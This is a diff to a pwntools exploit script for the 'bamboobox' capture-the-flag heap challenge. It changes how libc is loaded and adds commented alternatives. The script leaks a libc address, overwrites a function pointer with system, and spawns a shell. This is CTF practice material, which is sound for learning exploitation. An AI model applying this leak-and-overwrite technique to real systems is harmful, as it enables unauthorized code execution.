@@ -3,7 +3,6 @@
 __Auther__ = 'M4x'
 
 from pwn import *
-from zio import l64
 from time import sleep
 import sys
 context.arch = 'amd64'
@@ -11,8 +10,8 @@ context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 io = process("./bamboobox")
-libc = io.libc
 elf = ELF("./bamboobox")
+libc = elf.libc
 
 def DEBUG():
 	raw_input("DEBUG: ")
@@ -53,9 +52,12 @@ if __name__ == "__main__":
     show()
     libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
     success("libc.address -> {:#x}".format(libc.address))
+    #  libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
+    #  success("libcBase -> {:#x}".format(libcBase))
     pause()
 
     change(0, 0x8, p64(libc.sym['system']))
+    #  change(0, 0x8, p64(libcBase + libc.sym['system']))
     io.sendline('$0')
 
     io.interactive()
